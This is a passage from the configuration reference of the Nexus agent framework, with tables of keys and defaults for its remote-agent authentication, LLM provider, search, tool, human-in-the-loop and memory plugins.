| `client_secret`     | string   | *(none)* | The client secret, inline. Prefer `client_secret_env`. |
| `client_secret_env` | string   | *(none)* | Name of an environment variable holding the client secret. |
| `token_url`         | string   | *(discovered)* | The token endpoint. Optional when the agent has a `base_url`: it is then discovered from the card's `oauth2` `clientCredentials` flow on first use. **Required** for an agent that pins `jsonrpc_endpoint`/`rest_endpoint` instead, since there is no card to discover it from. |
| `scopes`            | list     | *(none)* | Scopes requested in the token request, joined with spaces. Not defaulted from the card: requesting every scope a remote advertises is broader than any deployment needs. |
| `audience`          | string   | *(none)* | Value of the widely-supported (non-standard) `audience` parameter. Sent only when set. |
| `auth_style`        | string   | `basic`  | How the client authenticates to the token endpoint. `basic` is HTTP Basic per RFC 6749 §2.3.1; `body` puts `client_id`/`client_secret` in the form body, for a server that only accepts that. |
| `refresh_leeway`    | duration | `30s`    | How far ahead of the stated expiry a token is replaced. Clamped to half the token lifetime when the lifetime is shorter than the leeway. A server that omits `expires_in` is assumed to have issued a 60-second token. |

One id/secret pair is required: set `client_id` or `client_id_env`, and
`client_secret` or `client_secret_env`. When `token_url` is being discovered
from the card, the well-known Agent Card fetch — and only that fetch — goes out
unauthenticated, because the token cannot be obtained before the endpoint that
issues it is known. Specification §8.2 makes the well-known card a public
document; a remote that protects its card wants `token_url` set explicitly.

`type: mtls` — client-certificate authentication, wired into the
`http.Transport`. Every path is resolved through the engine's `~` expansion and
read at `Init`:

| Key           | Type   | Default | Description |
|---------------|--------|---------|-------------|
| `cert_file`   | string | *(required)* | Path to the PEM client certificate. |
| `key_file`    | string | *(required)* | Path to the PEM private key matching `cert_file`. |
| `ca_file`     | string | *(system roots)* | Path to a PEM bundle used to verify the **remote's** certificate, for a private CA. |
| `server_name` | string | *(from the URL)* | Override the TLS server name used for SNI and certificate verification, for a remote reached by an address its certificate does not name. |

On the **first** call to a remote — never at boot, since the card is fetched
lazily — the configured credential is compared against the card's
`securitySchemes`, and an obvious mismatch (a bearer token against a card
declaring only `mutualTls`, say) logs one **warning**. It warns rather than
refuses: a card's `securitySchemes` block is optional and routinely incomplete,
and refusing on that evidence would break working deployments over a
documentation defect.

The `retry` block, at either level:

| Key            | Type     | Default  | Description |
|----------------|----------|----------|-------------|
| `max_attempts` | int      | `3`      | Total attempts including the first. `1` disables retrying. |
| `base_delay`   | duration | `200ms`  | Delay before the second attempt; doubles thereafter. |
| `max_delay`    | duration | `5s`     | Cap on the computed backoff. A longer `Retry-After` from the server is still honoured in full. |

Reads are retried on transport failures and `502`/`504`; every operation is
retried on `429`/`503`. A message send is **never** retried on a transport
failure, because A2A defines no idempotency key and a blind retry would run the
remote's work twice.

Every duration key is a **duration string** (`"90s"`, `"5m"`, `"1h30m"`), never a
bare number: `timeout: 600` reads as ten minutes to an operator and six hundred
nanoseconds to Go, so a bare number is rejected rather than guessed at.

**Timeout precedence** for one call, first match wins: the tool's
`timeout_seconds` argument → the agent's `posture` budget `timeout` → the
`timeout` key (agent-level, else plugin-level) → the `5m` built-in default.

**Posture budgets.** Only two dimensions of an `AgentPosture` cross an A2A
boundary — `default_budget.timeout` and `max_recursion_depth` — because the
protocol gives a client no control over the remote's token or tool-call spend.
A posture whose `default_budget` sets `max_tokens` or `max_tool_calls` is
**refused** for a remote agent rather than half-honoured, and the call fails with
an error naming the key.

**Caching.** Successful outcomes are cached in the LRU under a content hash of
(remote identity, posture version, task, canonicalized context). Failures are
never cached, so a remote that was briefly down is retried rather than replayed,
and neither is any outcome a human answered a question for.

**Cancellation.** `cancel.active` — the event `nexus.control.cancel` emits once a
cancellation is happening — retracts any question this plugin put in front of a
human, issues `CancelTask` to every remote task in flight, and aborts the calls.
The same abandonment runs on the ordinary exits too: if this instance walks away
from a remote task that has not reached a terminal state, it tells the remote.

### `nexus.scene`

Source: `plugins/scene/plugin.go`. Owns the per-session `Scene` store and
registers the `scene_create` / `scene_patch` / `scene_get` / `scene_list` /
`scene_delete` tools. Every patch is journaled to
`<session>/plugins/nexus.scene/scenes.jsonl` so the replay primitive can
reconstruct historical scene state. See [Scenes](../architecture/scenes.md).

No config keys today; activate the plugin in `plugins.active` and the
default tools register at boot.

---

## LLM providers

All providers share the same retry block schema (see "Retry" subtable below).

### `nexus.llm.anthropic`

Source: `plugins/providers/anthropic/plugin.go` + `auth.go`, `pricing.go`,
`cache.go`, `thinking.go`, `multimodal.go`, `citations.go`,
`structured_outputs.go`, `files.go`, `retry.go`.

| Key                                | Type   | Default             | Description |
|------------------------------------|--------|---------------------|-------------|
| `debug`                            | bool   | `false`             | Persist request/response bodies to the session for debugging. |
| `auth_mode`                        | string | `api_key`           | One of `api_key`, `bedrock`, `vertex`. |
| `api_key`                          | string | *(env)*             | Direct API key (used when `auth_mode: api_key`). |
| `api_key_env`                      | string | `ANTHROPIC_API_KEY` | Environment variable to read the API key from. |
| `bedrock.region`                   | string | *(env `AWS_REGION`)* | AWS region for Bedrock. |
| `bedrock.access_key_id`            | string | *(env `AWS_ACCESS_KEY_ID`)*     | AWS access key. |
| `bedrock.access_key_id_env`        | string | `AWS_ACCESS_KEY_ID` | Override the env var name. |
| `bedrock.secret_access_key`        | string | *(env `AWS_SECRET_ACCESS_KEY`)* | AWS secret. |
| `bedrock.secret_access_key_env`    | string | `AWS_SECRET_ACCESS_KEY` | Override the env var name. |
| `bedrock.session_token`            | string | *(env `AWS_SESSION_TOKEN`)*     | Optional STS session token. |
| `bedrock.session_token_env`        | string | `AWS_SESSION_TOKEN` | Override the env var name. |
| `vertex.project` / `project_id`    | string | *(env `GOOGLE_CLOUD_PROJECT`)*  | GCP project. |
| `vertex.region` / `location`       | string | `us-east5`          | Vertex region. |
| `vertex.sa_key_file` / `service_account_json` | string | *(env `GOOGLE_APPLICATION_CREDENTIALS`)* | Path to the service-account JSON. |
| `vertex.sa_key_file_env` / `service_account_json_env` | string | `GOOGLE_APPLICATION_CREDENTIALS` | Override the env var name. |
| `cache.enabled`                    | bool   | `false`             | Enable prompt caching. |
| `cache.system`                     | bool   | `true`              | Mark the system prompt for caching when enabled. |
| `cache.tools`                      | bool   | `true`              | Mark the tools array for caching when enabled. |
| `cache.message_prefix`             | int    | `0`                 | Number of leading user messages to mark for caching. |
| `cache.ttl`                        | string | `5m`                | Cache TTL: `5m` (ephemeral) or `1h` (extended). |
| `thinking.enabled`                 | bool   | `false`             | Enable extended thinking (Sonnet 4+, Opus 4+). |
| `thinking.budget_tokens`           | int    | `8192`              | Thinking token budget; `-1` for dynamic, `0` to disable, `1024+` fixed. |
| `thinking.include_thoughts`        | bool   | `true`              | Surface thinking content via `thinking.step` events. |
| `multimodal.pdf_beta`              | bool   | `false`             | Send the `pdfs-2024-09-25` beta header for legacy PDF support. |
| `citations.enabled`                | bool   | `false`             | Enable citations on document blocks. |
| `structured_outputs.mode`          | string | `tool`              | `tool` (synthetic tool) or `native` (`response_format`). |
| `structured_outputs.beta_header`   | string | *(none)*            | Optional beta header when `mode: native`. |
| `files.enabled`                    | bool   | `false`             | Use the Anthropic Files API for oversize attachments. |
| `files.upload_threshold`           | int    | `40960`             | Minimum bytes before a file is uploaded; smaller files are inlined. |
| `files.cache_uploads`              | bool   | `true`              | Deduplicate identical uploads within a session. |
| `files.delete_on_shutdown`         | bool   | `false`             | Delete uploaded files when the engine shuts down. |
| `retry.*`                          | —      | *(see Retry block)* | Backoff configuration. |
| `pricing.<model>.*`                | map    | *(embedded table)*  | Override per-model token pricing — see "Pricing override". |

#### Retry block (shared by all providers)

| Key                    | Type     | Default                                  | Description |
|------------------------|----------|------------------------------------------|-------------|
| `retry.enabled`        | bool     | `true`                                   | Enable retry on 5xx / 429. |
| `retry.max_retries`    | int      | `3`                                      | Maximum attempts. |
| `retry.initial_delay`  | duration | `1s`                                     | First backoff delay. |
| `retry.max_delay`      | duration | `60s`                                    | Maximum delay between retries. |
| `retry.backoff`        | string   | `exponential`                            | `constant`, `linear`, `exponential`, or `jitter`. |
| `retry.multiplier`     | float    | `2.0`                                    | Multiplier for `linear`/`exponential`. |
| `retry.statuses`       | int list | Anthropic: `[429, 500, 502, 503, 529]`<br/>OpenAI/Gemini: `[429, 500, 502, 503]` | HTTP statuses to retry. |

#### Pricing override

| Key                                       | Type  | Default                 | Description |
|-------------------------------------------|-------|-------------------------|-------------|
| `pricing.<model>.input_per_million`       | float | *(embedded default)*    | Cost per million input tokens. |
| `pricing.<model>.output_per_million`      | float | *(embedded default)*    | Cost per million output tokens. |
| `pricing.<model>.cache_read_per_million`  | float | *(derived from input)*  | Anthropic: `0.10×input`; OpenAI: `0.5×input`. |
| `pricing.<model>.cache_write_5m_per_million` | float | *(derived: `1.25×input`)* | Anthropic only. |
| `pricing.<model>.cache_write_1h_per_million` | float | *(derived: `2.0×input`)*  | Anthropic only. |

### `nexus.llm.openai`

Source: `plugins/providers/openai/plugin.go`.

| Key                          | Type   | Default                              | Description |
|------------------------------|--------|--------------------------------------|-------------|
| `debug`                      | bool   | `false`                              | Persist request/response bodies to the session. |
| `auth_mode`                  | string | `openai`                             | `openai`, `azure_key`, or `azure_aad`. |
| `api_key`                    | string | *(env)*                              | Direct API key (`auth_mode: openai`, also fallback for Azure Files API). |
| `api_key_env`                | string | `OPENAI_API_KEY`                     | Environment variable for the key. |
| `base_url`                   | string | `https://api.openai.com/v1`          | Override for proxies / OpenAI-compatible endpoints. |
| `azure.endpoint`             | string | *(required for Azure)*               | Azure OpenAI endpoint URL. |
| `azure.api_key`              | string | *(env `AZURE_OPENAI_API_KEY`)*       | Azure key (when `auth_mode: azure_key`). |
| `azure.api_key_env`          | string | `AZURE_OPENAI_API_KEY`               | Override the env var name. |
| `azure.api_version`          | string | `2024-12-01-preview`                 | Azure OpenAI API version. |
| `azure.use_msi`              | bool   | `false`                              | Use Managed Service Identity (`auth_mode: azure_aad`); otherwise falls back to Azure CLI auth. |
| `files.enabled`              | bool   | `false`                              | Use the Files API. |
| `files.purpose`              | string | `assistants`                         | File purpose category. |
| `files.upload_threshold`     | int    | `40960`                              | Minimum bytes to upload. |
| `files.cache_uploads`        | bool   | `true`                               | Deduplicate within a session. |
| `files.delete_on_shutdown`   | bool   | `false`                              | Delete on shutdown. |
| `reasoning.enabled`          | bool   | `false`                              | Enable o-series reasoning. |
| `reasoning.budget_tokens`    | int    | `10000`                              | Reasoning token budget. |
| `force_reasoning`            | bool   | `false`                              | Force reasoning even for non-o-series models (experimental). |
| `multimodal.vision`          | bool   | `true`                               | Allow image inputs (GPT-4V). |
| `retry.*`                    | —      | *(shared Retry block)*               | Backoff configuration. |
| `pricing.<model>.*`          | map    | *(embedded table)*                   | Override per-model pricing. |

### `nexus.llm.gemini`

Source: `plugins/providers/gemini/plugin.go`.

| Key                          | Type   | Default                                          | Description |
|------------------------------|--------|--------------------------------------------------|-------------|
| `debug`                      | bool   | `false`                                          | Persist request/response bodies. |
| `api_key`                    | string | *(env `GEMINI_API_KEY` or `GOOGLE_API_KEY`)*     | Public Generative Language API key. |
| `api_key_env`                | string | *(tries both env vars above)*                    | Override the env var name. |
| `vertex.project`             | string | *(env `GOOGLE_CLOUD_PROJECT`)*                   | Project ID for Vertex AI. |
| `vertex.region` / `location` | string | `us-central1`                                    | Vertex region. |
| `vertex.sa_key_file`         | string | *(env `GOOGLE_APPLICATION_CREDENTIALS`)*         | Service-account JSON path. |
| `vertex.sa_key_file_env`     | string | `GOOGLE_APPLICATION_CREDENTIALS`                 | Override the env var name. |
| `thinking.enabled`           | bool   | `false`                                          | Enable thinking on Gemini 2.5+. |
| `thinking.budget_tokens`     | int    | `8000`                                           | Thinking token budget. |
| `thinking.include_thoughts`  | bool   | `true`                                           | Surface thinking via `thinking.step`. |
| `code_execution`             | bool   | `false`                                          | Enable Gemini's built-in code-execution tool. |
| `cache.enabled`              | bool   | `false`                                          | Enable prompt caching (Gemini 2.0+). |
| `cache.min_tokens`           | int    | `1000`                                           | Minimum tokens required for caching. |
| `cache.ttl`                  | string | `5m`                                             | Cache TTL: `5m` or `1h`. |
| `retry.*`                    | —      | *(shared Retry block)*                           | Backoff configuration. |
| `pricing.<model>.*`          | map    | *(embedded table)*                               | Override per-model pricing. |

### `nexus.provider.fallback`

Source: `plugins/providers/fallback/plugin.go`. **No plugin-level config** — the
fallback chain is defined by listing multiple providers under a single role in
`core.models`. This plugin coordinates the re-emission to the next provider on
non-retryable errors.

### `nexus.provider.fanout`

Source: `plugins/providers/fanout/plugin.go`.

| Key                       | Type    | Default | Description |
|---------------------------|---------|---------|-------------|
| `strategy`                | string  | `all`   | Selection strategy: `all` (return first to arrive), `llm_judge`, `heuristic`, `user`. |
| `deadline_ms`             | int     | `30000` | Milliseconds to wait before forcing selection. |
| `heuristic.prefer`        | string  | `longest` | Used when `strategy: heuristic`: `longest`, `shortest`, `fastest`, `cheapest`. |
| `heuristic.require_finish`| bool    | `false` | Only consider responses with `finish_reason: end_turn`. |
| `judge.role`              | string  | *(none)* | Model role for the judge LLM call when `strategy: llm_judge`. |

A role becomes a fanout role when its `core.models` entry sets `fanout: true`;
the fanout plugin watches `before:llm.request` for those roles. For
`strategy: user`, the plugin emits `provider.fanout.choose` and waits for
`provider.fanout.chosen` from the IO layer.

### Search providers (`search.provider` capability)

Each search-provider plugin handles `search.request` events and writes results
back into the payload. They share the same shape:

| Plugin                              | Source                                              |
|-------------------------------------|-----------------------------------------------------|
| `nexus.search.brave`                | `plugins/search/brave/plugin.go`                    |
| `nexus.search.anthropic_native`     | `plugins/search/anthropic_native/plugin.go`         |
| `nexus.search.openai_native`        | `plugins/search/openai_native/plugin.go`            |
| `nexus.search.gemini_native`        | `plugins/search/gemini_native/plugin.go`            |

| Key            | Type     | Default                            | Notes                                                 |
|----------------|----------|------------------------------------|-------------------------------------------------------|
| `api_key`      | string   | *(env, see below)*                 | Direct API key.                                       |
| `api_key_env`  | string   | provider default (see below)       | Override the env var name.                            |
| `model`        | string   | provider default (see below)       | Only on native search providers.                      |
| `base_url`     | string   | provider default (see below)       | Override the upstream endpoint. Available on `brave`, `openai_native`, and `gemini_native`. Primarily useful for httptest-driven integration tests; OpenAI-compatible proxies can also be wired here. |
| `timeout`      | duration | `15s` (Brave), `30s` (others)      | HTTP request timeout.                                 |

Provider defaults:

| Provider                          | `api_key_env`                        | `model`                          | `base_url` default                                                       |
|-----------------------------------|--------------------------------------|----------------------------------|--------------------------------------------------------------------------|
| `nexus.search.brave`              | `BRAVE_API_KEY`                      | n/a                              | `https://api.search.brave.com/res/v1/web/search`                         |
| `nexus.search.anthropic_native`   | `ANTHROPIC_API_KEY`                  | `claude-haiku-4-5-20251001`      | n/a (no override)                                                        |
| `nexus.search.openai_native`      | `OPENAI_API_KEY`                     | `gpt-4o-mini`                    | `https://api.openai.com/v1/responses`                                    |
| `nexus.search.gemini_native`      | `GEMINI_API_KEY` / `GOOGLE_API_KEY`  | `gemini-2.5-flash`               | `https://generativelanguage.googleapis.com/v1beta`                       |

If multiple providers register the `search.provider` capability, pin one
explicitly via the top-level `capabilities:` block.

---

## Tools

### `nexus.tool.shell`

Source: `plugins/tools/shell/plugin.go`. Routes commands through
`pkg/engine/sandbox` so the kernel surface is a single audited boundary.

| Key                | Type     | Default                  | Description |
|--------------------|----------|--------------------------|-------------|
| `working_dir`      | string   | *(session files dir)*    | Working directory for executions. |
| `timeout`          | duration | `30s`                    | Per-command timeout. |
| `sandbox.backend`  | string   | `host`                   | Sandbox tier: `host` (current behaviour). Future: `gvisor`, `firecracker`, `landlock`. |
| `sandbox.allowed_commands` | list | *(none — all allowed)* | Whitelist of base command names. |
| `sandbox.path_dirs`        | list | *(none)*               | Directories prepended to `PATH`. |
| `sandbox.env_restrict`     | bool | `false`                | Strip sensitive env vars (AWS, Google, Azure, Anthropic API keys) before execution. |
| `sandbox.timeout`          | duration | `30s`              | Per-command default; `timeout` above wins per-call. |

### `nexus.tool.file`

Source: `plugins/tools/fileio/plugin.go`. Registers `read_file`, `write_file`,
`check_file_size`, `list_files`, `read_image`, `read_document`.

`read_image` and `read_document` return a `MessagePart` on
`ToolResult.OutputParts`; the memory plugin copies parts onto the resulting
tool-role `Message.Parts` so the next LLM request sees the multimodal
content. Provider plugins resolve `MessagePart.URI = "nexus-blob:<sha>"`
references from the per-session blob store at `~/.nexus/sessions/<id>/blobs/`
when the payload was stored, or use the inline `MessagePart.Data` when it
was inlined.

| Key                          | Type   | Default                 | Description |
|------------------------------|--------|-------------------------|-------------|
| `base_dir`                   | string | *(session files dir)* | Base directory for file operations. |
| `allow_external_writes`      | bool   | `false`               | Permit reads/writes outside `base_dir`. |
| `blob_store.byte_budget`     | int    | `2147483648` (2 GiB)  | Soft cap on total stored blob bytes per session. `0` = unbounded. Applied via LRU sweep after each blob put. |
| `blob_store.inline_threshold`| int    | `262144` (256 KiB)    | Payloads at or below this size are inlined on the `MessagePart` instead of being stored as a blob. |
| `tools.<tool_name>`          | bool   | `true` for each       | Per-tool enable/disable: `read_file`, `write_file`, `check_file_size`, `list_files`, `read_image`, `read_document`. |

### `nexus.tool.catalog`

Source: `plugins/tools/catalog/plugin.go`. **No configuration.** Provides the
`tool.catalog` capability — a shared registry queried via
`tool.catalog.query`. Required by `nexus.agent.react`.

### `nexus.tool.web`

Source: `plugins/tools/web/plugin.go`. Registers `web_search`, `web_fetch`,
and `fetch_page_image`. Requires the `search.provider` capability for
`web_search`. `fetch_page_image` requires `screenshot_provider` config —
without it, the tool surfaces a clear error at invoke time.

| Key                              | Type     | Default                                | Description |
|----------------------------------|----------|----------------------------------------|-------------|
| `search.default_count`           | int      | `10`                                   | Default result count for `web_search`. |
| `search.default_safe_search`     | string   | `moderate`                             | `off`, `moderate`, `strict`. |
| `search.default_language`        | string   | *(none)*                               | BCP-47 language tag (e.g. `en`, `es-MX`). |
| `fetch.user_agent`               | string   | `Nexus/0.1 (+https://...)`             | User-Agent header for `web_fetch`. |
| `fetch.timeout`                  | duration | `20s`                                  | HTTP timeout. |
| `fetch.max_size`                 | int      | `5242880` (5 MB)                       | Maximum response body size. |
| `fetch.default_extract`          | string   | `readability`                          | `readability` or `raw`. |
| `fetch.allowed_domains`          | list     | *(none — allow all)*                   | Allowlist of domains. |
| `fetch.blocked_domains`          | list     | *(none)*                               | Blocklist of domains. |
| `fetch.follow_redirects`         | bool     | `true`                                 | Follow HTTP redirects. |
| `fetch.max_redirects`            | int      | `5`                                    | Maximum redirect chain length. |
| `screenshot_provider.url`        | string   | *(required for `fetch_page_image`)*    | Endpoint of the external screenshot service (urlbox, screenshotapi.net, browserless, …). |
| `screenshot_provider.method`     | string   | `POST`                                 | `GET` or `POST`. |
| `screenshot_provider.api_key_env`| string   | *(none)*                               | Env var holding the bearer token / API key. POST sends `Authorization: Bearer <key>`; GET appends `api_key=<key>` to the query. |
| `screenshot_provider.url_param_name` | string | `url`                              | Field name carrying the target URL. |
| `screenshot_provider.request_template` | map | *(empty)*                          | Extra fields merged into the JSON body (POST) or query string (GET). |
| `screenshot_provider.headers`    | map      | *(empty)*                              | Fixed headers sent with every provider request. |
| `blob_store.byte_budget`         | int      | `2147483648` (2 GiB)                   | Soft cap on total stored blob bytes per session for `fetch_page_image`. `0` = unbounded. |
| `blob_store.inline_threshold`    | int      | `262144` (256 KiB)                     | Payloads at or below this size are inlined on the `MessagePart` instead of stored as a blob. |

### `nexus.tool.knowledge_search`

Source: `plugins/tools/knowledge_search/plugin.go`. Requires
`embeddings.provider` and `vector.store`.

| Key                  | Type   | Default            | Description |
|----------------------|--------|--------------------|-------------|
| `tool_name`          | string | `knowledge_search` | Name of the registered tool. |
| `top_k`              | int    | `5`                | Default chunks to return (LLM may override; capped at 50). |
| `include_metadata`   | bool   | `true`             | Include vector metadata alongside chunks. |
| `namespaces`         | list   | *(required)*       | Allowed vector store namespaces. |
| `default_namespaces` | list   | *(required)*       | Namespaces searched when the LLM doesn't specify. |

The active `embeddings.provider` plugin owns the model choice — there is
no consumer-side override. Configure the model once on the provider
plugin (e.g. `nexus.embeddings.openai.model`).

### `nexus.tool.pdf`

Source: `plugins/tools/pdf/plugin.go`. Registers `read_pdf`. Two modes
selectable per call via `mode` argument or `default_mode` config:

- `text` (default) — extract text via `pdftotext` (poppler-utils).
  Requires `pdftotext` on `PATH` (or `pdftotext_bin` config).
- `document` — return the raw PDF bytes as a `file` `MessagePart` on
  `ToolResult.OutputParts` for native multimodal providers (Anthropic,
  Gemini). No poppler call. `first_page`, `last_page`, and `layout`
  arguments are ignored in this mode.

If `default_mode` is `document` and `pdftotext` is missing, the plugin
boots; text mode then surfaces an actionable error per call.

| Key               | Type     | Default                | Description |
|-------------------|----------|------------------------|-------------|
| `pdftotext_bin`   | string   | `pdftotext`            | Path or name of the `pdftotext` binary. |
| `pdfinfo_bin`     | string   | `pdfinfo`              | Path or name of `pdfinfo` (optional). |
| `timeout`         | duration | `30s`                  | Per-extraction timeout. |
| `save_to_session` | bool     | `false`                | Persist extracted text to session files. |
| `save_file_name`  | string   | *(derived from PDF)*   | Custom filename for the saved text. |
| `default_mode`    | string   | `text`                 | `text` or `document`. Default `read_pdf` mode when the LLM doesn't supply one. |

### `nexus.tool.screenshot`

Source: `plugins/tools/screenshot/plugin.go`. Registers `take_screenshot`.
Captures the full screen as PNG and emits an `image` `MessagePart` on
`ToolResult.OutputParts`. Capture path is platform-specific:

- `darwin`: `screencapture -t png -x <tmpfile>`
- `linux`: `gnome-screenshot -f <tmpfile>`, then `grim <tmpfile>`, then
  ImageMagick's `import -window root <tmpfile>` as fallbacks
- other platforms: emits `ToolResult.Error: "screenshot not supported on this platform"`

| Key                          | Type     | Default               | Description |
|------------------------------|----------|-----------------------|-------------|
| `timeout`                    | duration | `15s`                 | Per-capture subprocess timeout. |
| `blob_store.byte_budget`     | int      | `2147483648` (2 GiB)  | Soft cap on total stored blob bytes per session. `0` = unbounded. |
| `blob_store.inline_threshold`| int      | `262144` (256 KiB)    | Payloads at or below this size are inlined on the `MessagePart` instead of stored as a blob. |

### `nexus.tool.opener`

Source: `plugins/tools/opener/plugin.go`. Registers `open_path`.

| Key        | Type     | Default                                                         | Description |
|------------|----------|-----------------------------------------------------------------|-------------|
| `open_cmd` | string   | platform default (`open` macOS, `xdg-open` Linux, `start` Win)  | Override the platform "open" command. |
| `timeout`  | duration | `10s`                                                           | Per-open timeout. |

### `nexus.control.hitl`

Source: `plugins/control/hitl/plugin.go`. The unified human-in-the-loop
primitive. Registers the LLM-facing `ask_user` tool with an extended
schema (`prompt`, `mode`, `choices`, `default_choice_id`,
`deadline_seconds`) and routes `hitl.requested` / `hitl.responded`
events between requesters (the tool, gates, memory plugins) and IO
surfaces. Replaces the prior `nexus.tool.ask`. See [Human-in-the-Loop
plugin docs](../plugins/control/hitl.md).

| Key                  | Type   | Default          | Description |
|----------------------|--------|------------------|-------------|
| `registry.enabled`   | bool   | `false`          | Mirror every `hitl.requested` to disk and watch for response files written by `nexus hitl respond`, webhook handlers, etc. |
| `registry.dir`       | string | `~/.nexus/hitl`  | Filesystem directory the registry uses for `<id>.request.yaml` / `<id>.response.yaml` pairs. Tilde expansion via `engine.ExpandPath`. Created at boot if missing. |

### `nexus.control.hitl_synthesizer`

Source: `plugins/control/hitl_synthesizer/plugin.go`. Optional
companion to `nexus.control.hitl` that renders context-aware approval
prompts via a small/cheap LLM. Advertises the
`hitl.prompt_synthesizer` capability; emitters opt in by setting
`HITLRequest.PromptSynthesizer = "hitl.prompt_synthesizer"` and
leaving `Prompt` empty. Subscribes to `before:hitl.requested`
(canonical vetoable entry point, pointer payload — every in-tree HITL
emitter publishes here first) and to `hitl.requested` as a backward
compat fallback for out-of-tree emitters that publish a `*HITLRequest`
pointer directly, ahead of every IO plugin so the rendered text is in
place before the operator sees the prompt.
Synthesised prompts are cached on disk under
`<session>/plugins/nexus.control.hitl_synthesizer/cache.jsonl`, keyed by
`(action_kind, sha256(action_ref))`. See
[HITL Prompt Synthesizer docs](../plugins/control/hitl_synthesizer.md).

| Key                    | Type   | Default                              | Description |
|------------------------|--------|--------------------------------------|-------------|
| `model_role`           | string | `quick`                              | Model role (resolved via `core.models`) used for synthesis. |
| `max_action_ref_chars` | int    | `1500`                               | ActionRef truncation budget (in JSON characters) before sending to the model. |
| `cache_enabled`        | bool   | `true`                               | Toggle the on-disk cache. Disable for debugging or strict-determinism runs. |
| `fallback_prompt`      | string | `Approve action: {{.action_kind}}`   | Go `text/template` over `{action_kind, action_ref, requester_plugin, request_id}` used when synthesis fails. |

### `nexus.tool.code_exec`

Source: `plugins/tools/codeexec/plugin.go`. Registers `run_code` (Go).
Two compilers selected via `compiler`:

- `yaegi-host` (default) — in-process Yaegi interpreter. Full dynamic
  bindings (`tools.*`, `parallel.*`, skill helpers); no kernel isolation.
- `yaegi-wasm` — embedded Yaegi runner inside a wazero-managed Wasm
  sandbox. Capability-gated I/O via `nexus_sdk/{http,fs,exec,env}`. v1
  forfeits `tools.*`, `parallel.*`, and skill helpers — the bridge SDK
  does not surface them.

Multimodal helper (host compiler only): scripts may
`import "nexus"` and call `nexus.ReturnImage(data []byte, mimeType string)`
to attach images to the resulting `tool.result` (alongside `main.Run`'s
JSON return). Multiple calls stack in script order; the routing follows
the same inline / blob-store threshold pattern used by other multimodal
tools.

| Key                 | Type   | Default                    | Description |
|---------------------|--------|----------------------------|-------------|
| `compiler`          | string | `yaegi-host`               | `yaegi-host` or `yaegi-wasm`. The latter requires `sandbox.backend: wasm`. |
| `timeout_seconds`   | int    | `30`                       | Script timeout in seconds. |
| `max_output_bytes`  | int    | `65536`                    | Maximum captured output. |
| `max_workers`       | int    | `runtime.NumCPU()`         | Concurrency cap for `parallel.*` (yaegi-host only). |
| `persist_scripts`   | bool   | `true`                     | Write executed scripts to session files. |
| `reject_goroutines` | bool   | `true`                     | Reject scripts that spawn goroutines. |
| `allowed_packages`  | list   | *(stdlib whitelist)*       | Importable stdlib packages. |
| `blob_store.byte_budget`     | int | `2147483648` (2 GiB) | Soft cap on total stored blob bytes per session for `nexus.ReturnImage` payloads. `0` = unbounded. |
| `blob_store.inline_threshold`| int | `262144` (256 KiB)   | Payloads at or below this size are inlined on the `MessagePart` instead of being stored as a blob. |
| `sandbox.backend`   | string | `host`                     | Required `wasm` for `compiler: yaegi-wasm`. Other backends (`host`) reject `KindGoWasm` requests. |
| `sandbox.cache_dir` | string | *(none)*                   | Persistent wazero compilation cache. Recommended for fast cold-start across processes. |
| `sandbox.timeout`   | duration | `30s`                    | Default per-call wasm timeout. |
| `sandbox.net.policy` | string | `deny`                    | `deny` or `allow_hosts`. Empty `allow_hosts` = deny all. |
| `sandbox.net.allow_hosts` | list | *(empty)*              | Exact-match hostname allowlist for `nexus_sdk/http`. |
| `sandbox.fs_mounts` | list   | *(empty)*                  | List of `{host, guest, mode}` triples. `mode` is `ro` (default) or `rw`. Backs `nexus_sdk/fs`. |
| `sandbox.exec_allowed` | list | *(empty)*                | Allowlist of commands invokable from `nexus_sdk/exec.Run`. Empty = deny. |
| `sandbox.env`       | map    | *(empty)*                  | Sandbox-scoped env values returned by `nexus_sdk/env.Get`. Never the host's real env. |

The engine substitutes `${session_id}` in any string under the `sandbox:`
block at session start, so per-session host paths can be hard-coded:
`host: ~/.nexus/sessions/${session_id}/files`.

---

## Memory

### `nexus.memory.simple`

Source: `plugins/memory/simple/plugin.go`. **No configuration.** Provides
`memory.history`. Unbounded, in-memory, no persistence.

### `nexus.memory.capped`

Source: `plugins/memory/capped/plugin.go`. Provides `memory.history`. This is
the default `memory.history` provider auto-activated by `nexus.agent.react`.

| Key            | Type | Default | Description |
|----------------|------|---------|-------------|
| `max_messages` | int  | `100`   | Sliding window size; older messages dropped (with tool-pair safety). |
| `persist`      | bool | `true`  | Persist to `context/conversation.jsonl` in the session workspace. |

### `nexus.memory.summary_buffer`

Source: `plugins/memory/summary_buffer/plugin.go`. Provides both
`memory.history` and `memory.compaction`.

| Key                 | Type   | Default          | Description |
|---------------------|--------|------------------|-------------|
| `strategy`          | string | `message_count`  | Trigger: `message_count`, `token_estimate`, `turn_count`. |
| `message_threshold` | int    | `50`             | Used when `strategy: message_count`. |
| `token_threshold`   | int    | `30000`          | Used when `strategy: token_estimate`. |
| `turn_threshold`    | int    | `10`             | Used when `strategy: turn_count`. |
| `chars_per_token`   | float  | `4.0`            | Token estimation ratio. |
| `max_recent`        | int    | `8`              | Messages kept verbatim; older messages are summarized. |
| `model_role`        | string | `quick`          | Role used for the summary call. |
| `model`             | string | *(none)*         | Explicit model ID (ignored if `model_role` is set). |
| `prompt`            | string | *(default)*      | Inline summary prompt. The default prompt is reasoning-preservation aware: it instructs the summariser to wrap segments in `<summary topic="…" compressed-from-turns="…">…</summary>` and end with a `## Preserved Kinds:` trailer. Overriding loses both behaviours. |
| `prompt_file`       | string | *(none)*         | Path to a summary prompt file (overrides `prompt`). |
| `quality_retry`     | bool   | `false`          | When `true`, the plugin re-runs the summariser once with a stricter prompt if the trailer omits any required preserved kind. Off by default for backwards compatibility. |
| `require_preserved_kinds` | []string | `["decision", "rationale"]` | Kinds whose presence in the trailer is required when `quality_retry: true`. Allowed values: `decision`, `rationale`, `error`, `next_step`, `technical_detail`. |

### `nexus.memory.compaction`

Source: `plugins/memory/compaction/plugin.go`. Provides `memory.compaction` as
an external coordinator (separate from history buffers).

| Key                 | Type   | Default          | Description |
|---------------------|--------|------------------|-------------|
| `strategy`          | string | `message_count`  | Trigger: `message_count`, `token_estimate`, `turn_count`. |
| `message_threshold` | int    | `50`             | Used when `strategy: message_count`. |
| `token_threshold`   | int    | `30000`          | Used when `strategy: token_estimate`. |
| `turn_threshold`    | int    | `10`             | Used when `strategy: turn_count`. |
| `chars_per_token`   | float  | `4.0`            | Token estimation ratio. |
